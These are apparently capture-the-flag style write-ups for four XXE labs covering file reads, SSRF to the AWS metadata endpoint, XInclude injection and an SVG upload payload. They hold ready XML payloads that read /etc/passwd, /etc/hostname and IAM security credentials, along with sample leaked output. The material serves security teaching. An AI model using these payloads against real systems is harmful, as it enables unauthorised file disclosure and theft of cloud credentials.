# **LAB 1** Exploiting XXE using external entities to retrieve files
### Writeup: Exploiting XXE to Read the `/etc/passwd` File

---

#### **Objective**:
To demonstrate how an **XML External Entity (XXE)** vulnerability can be exploited to read sensitive files on a server, such as the `/etc/passwd` file, by manipulating an XML request.

---

#### **Steps**:

1. **Visit the Product Page**:
   - Navigate to the target website and visit a product page.
   - Look for a feature like "Check stock" or any functionality that triggers a request to check product availability.

2. **Intercept the Request**:
   - Open **Burp Suite** and configure your browser to route traffic through it.
   - Click the "Check stock" button on the product page.
   - In Burp Suite, intercept the resulting **POST request** in the **Proxy** tab.

3. **Analyze the Request**:
   - Observe that the request contains XML data, likely in the body of the POST request. For example:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <stockCheck>
         <productId>123</productId>
         <storeId>1</storeId>
     </stockCheck>
     ```

4. **Inject the External Entity Definition**:
   - Insert an external entity definition between the XML declaration and the `stockCheck` element. For example:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <stockCheck>
         <productId>&xxe;</productId>
         <storeId>1</storeId>
     </stockCheck>
     ```
   - Here, the `xxe` entity is defined to load the contents of the `/etc/passwd` file from the server.

5. **Replace the `productId` with the Entity Reference**:
   - Replace the numeric value of `productId` with a reference to the external entity (`&xxe;`). This will cause the server to replace `&xxe;` with the contents of the `/etc/passwd` file when parsing the XML.
![Screenshot from 2025-01-31 17-42-28](https://github.com/user-attachments/assets/881dd461-4902-4ef7-9067-2ed3214dbfe3)

6. **Forward the Request**:
   - Forward the modified request in Burp Suite and observe the server's response.

---

#### **Expected Result**:
- The server processes the malicious XML and attempts to resolve the `xxe` entity by reading the `/etc/passwd` file.
- The response will likely contain an error message like:
  ```
  Invalid product ID: root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  ```
- This output confirms that the server has successfully read and returned the contents of the `/etc/passwd` file, demonstrating the XXE vulnerability.
![Screenshot from 2025-01-31 17-43-11](https://github.com/user-attachments/assets/a52e8568-adf4-4ff3-ad2b-1bd5ace0e8ed)

---

# LAB 2 - Exploiting XXE to perform SSRF attacks
# **XXE to SSRF Exploitation Write-up**  

## **Objective**  
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's **IAM secret access key** from the **EC2 metadata endpoint**.

---

## **Steps to Exploit the XXE Vulnerability**  

### **1. Intercept the Stock Check Request**  
- Visit a product page on the target web application.  
- Click on **"Check stock"** to generate a request.  
- Open **Burp Suite** and go to the **Proxy** tab to **intercept the request**.  

---

### **2. Modify the XML Request to Inject an External Entity**  
- The original request body contains an XML structure like:  

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>123</productId>
  </stockCheck>
  ```  
![Screenshot from 2025-01-31 18-46-48](https://github.com/user-attachments/assets/8208044f-7c6c-4906-8c9f-8a8165d4d665)

- Modify it to include an **external entity definition** that targets the AWS metadata API:  

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "http://169.254.169.254/">  
  ]>
  <stockCheck>
    <productId>&xxe;</productId>
  </stockCheck>
  ```  

- Forward this request to the server.  

---

### **3. Extract the Initial Metadata Response**  
- The response should contain an **"Invalid product ID"** message, followed by the **contents of the metadata endpoint**.  
- The initial response may list available folders, such as:  

  ```
  Invalid product ID: meta-data/
  ```  

---

### **4. Explore the AWS Metadata API**  
- Modify the **entity URL** to explore deeper directories:  

  ```
  <!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  
  ]>
  <stockCheck>
    <productId>&xxe;</productId>
  </stockCheck>
  ```  

- The response should return available metadata categories:  

  ```
  Invalid product ID: iam/
  ```

- Continue refining the payload to extract **IAM credentials**:  

  ```
  <!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">  
  ]>
  <stockCheck>
    <productId>&xxe;</productId>
  </stockCheck>
  ```  

---

### **5. Extract AWS Credentials**  
- The response should now return **AWS IAM credentials** in JSON format, containing:  
  - `AccessKeyId`  
  - `SecretAccessKey`  
  - `Token`  

  Example response:  

  ```
  "Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2025-01-31T13:00:03.058000926Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "FZAOCiMDHsO0sjuoAmMY",
  "SecretAccessKey" : "qFd3EBresB8ROr5aGcySRLKZj5n3dC0Diz1C2OEJ",
  "Token" : "V71vS981zt0MzLNZc7zhtVT87oqyzCjEcxHg9eF7nWE9mMrY3e1gR04sHuil6aWBHiszKbD4Qbx58fp1Rx2qkWuDb0X0DzgY6o7pZtSC1mk88hV4IK5JlLR4sGH8DZHwQ5tZ6k0qiaSjXBIFXoACF3AJx48JIYVGTtqQ7n3RviG3lvdUg1mWz0l2xC4cDfTv5XnPMkz5dSHAMeubWcOegy4piHU1hO6ejqSh623Zr11uP7mXbMYQDuuuTR4WmW4u",
  "Expiration" : "2031-01-30T13:00:03.058000926Z" }
  ```
  ![Screenshot from 2025-01-31 18-47-21](https://github.com/user-attachments/assets/fea2f16b-575b-468f-b4a7-345687dfcb84)
 

# **XXE Lab 3 – Exploiting XInclude to retrieve files**  

## **Objective**  
The goal of this lab is to exploit an **XXE (XML External Entity) vulnerability** using the **XInclude feature**, as **DTD (Document Type Definition) is not available**. We will verify if the application processes XML input and then use XInclude to read sensitive files from the server.  

---

## **Steps to Exploit the XXE Vulnerability**  

### **1️ Intercept the Stock Check Request**  
- Open **Burp Suite** and enable **interception** in the **Proxy** tab.  
- Navigate to the **product stock check** functionality in the target web application.  
- Submit a stock check request for a product (e.g., Product ID `1`).  
- Burp Suite captures the following **original request**:  

  ```
  POST /stock HTTP/1.1
  Host: vulnerable-website.com
  Content-Type: application/x-www-form-urlencoded

  productId=1&storeId=1
  ```

---

### **2️ Test if the Application Processes XML**  
- Modify the `productId` value to include **an XML tag** to check if the backend processes input as XML:  

  ```
  productId=<test>&storeId=1
  ```

- **Forward the request** to the server.  
- The response contains an **XML parsing error**, confirming that the server processes our input as **part of an XML document**.  

---

### **3️ Exploit the XInclude Vulnerability to Read `/etc/passwd`**  
- Since **DTD is not available**, we use **XInclude** instead of a traditional **XXE payload**.  
- Modify the `productId` parameter to inject the **XInclude payload**:  

  ```
  productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
  ```
![Screenshot from 2025-02-01 19-24-50](https://github.com/user-attachments/assets/323ae30d-bcea-400f-a98c-2041fc387b65)

- The full **modified request** in Burp Suite:  

  ```
  POST /stock HTTP/1.1
  Host: vulnerable-website.com
  Content-Type: application/x-www-form-urlencoded

  productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
  ```
![Screenshot from 2025-02-01 19-32-43](https://github.com/user-attachments/assets/daa64faa-cc45-45a1-9718-b42b96ca4d10)

---

### **4️ Retrieve `/etc/passwd` Content**  
- Send the modified request.  
- The server responds with the contents of `/etc/passwd`, confirming the vulnerability:  

  
"Invalid product ID: root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

- This proves that we successfully **read sensitive system files** using XInclude.  
![Screenshot from 2025-02-01 19-33-15](https://github.com/user-attachments/assets/352b2ecd-e5c7-4656-adda-e405c33a76c3)

---

## **Impact**  
- **File Disclosure** → Attackers can access **system files**, configuration files, and credentials.  
- **Privilege Escalation** → Accessing files like `/etc/shadow` (password hashes) or SSH keys may allow further attacks.  
- **Server Compromise** → If an attacker retrieves API keys or database credentials, they may gain **full control** over the system.  


**Lab 4: Exploiting XXE via image file upload**

### Write-Up: Exploiting XXE Vulnerability with an SVG Payload

**Objective**: Create a local SVG image with an embedded **XXE** (XML External Entity) payload to extract the contents of the `/etc/hostname` file from a vulnerable server. The attack will be executed by uploading the SVG as an avatar on a blog post comment section.

---

### Steps to Reproduce the Exploit:

1. **Create the SVG Payload**: 

   - Open a text editor and create a new SVG file with the following content:

     ```xml
     <?xml version="1.0" standalone="yes"?>
     <!DOCTYPE test [
         <!ENTITY xxe SYSTEM "file:///etc/hostname">
     ]>
     <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
         <text font-size="16" x="0" y="16">&xxe;</text>
     </svg>
     ```
     ![Screenshot from 2025-02-01 22-32-07](https://github.com/user-attachments/assets/5e3a9434-701e-412d-9927-dc24c57afc17)

   - **Explanation**:
     - The `DOCTYPE` section defines an external entity named `xxe`, which points to the server's `/etc/hostname` file (`SYSTEM "file:///etc/hostname"`).
     - The `<text>` element contains `&xxe;`, which, when the file is parsed by an XML parser that allows external entities, will be replaced by the content of the `/etc/hostname` file (which typically contains the hostname of the server).

2. **Upload the SVG as an Avatar**:
   - Visit the blog post or platform where you can post a comment.
   - When submitting your comment, upload the SVG file created in step 1 as your **avatar** image.
   ![Screenshot from 2025-02-01 23-17-02](https://github.com/user-attachments/assets/c4824f78-7268-4116-80a2-9d15d4892a2b)

   - **Note**: The platform must process the image file as an XML document (e.g., some systems use XML parsers to process SVG images) and be vulnerable to XXE attacks (i.e., it doesn’t have protections like disabling external entity resolution).

3. **View the Comment**:
   - After submitting the comment with the avatar, view your comment.
   - The **image** (SVG) should now display, but instead of a typical avatar, the **contents of the `/etc/hostname` file** will be rendered in the `<text>` element of the SVG.
   
   - **Expected Outcome**: The SVG image will reveal the server's hostname as part of the image. The output will be something like:

     ```
     d0f9a5a5db3d
     ```
![Screenshot from 2025-02-01 22-31-49](https://github.com/user-attachments/assets/13f2cac0-df6d-468e-96c9-3f63379793af)

4. **Submit the Solution**:
   - Use the "Submit solution" button to submit the revealed value of the server's hostname as part of the challenge or solution.
![Screenshot from 2025-02-01 22-31-42](https://github.com/user-attachments/assets/eec10e62-1b07-41a5-9253-04800815d6c8)

---

### Key Concepts:

- **XXE (XML External Entity)**: XXE is a vulnerability in XML parsers that allows an attacker to inject malicious XML content, such as references to external entities (files, URLs, etc.). In this case, the external entity is pointing to a local file on the server, `/etc/hostname`.
  
- **SVG (Scalable Vector Graphics)**: SVG is an XML-based image format. By embedding an XXE payload in an SVG, we can exploit XML parsing vulnerabilities in systems that process SVG files as XML documents.
  
- **External Entity Declaration**: The `<!ENTITY xxe SYSTEM "file:///etc/hostname">` part of the payload instructs the XML parser to load the contents of `/etc/hostname` whenever `&xxe;` is encountered in the document.

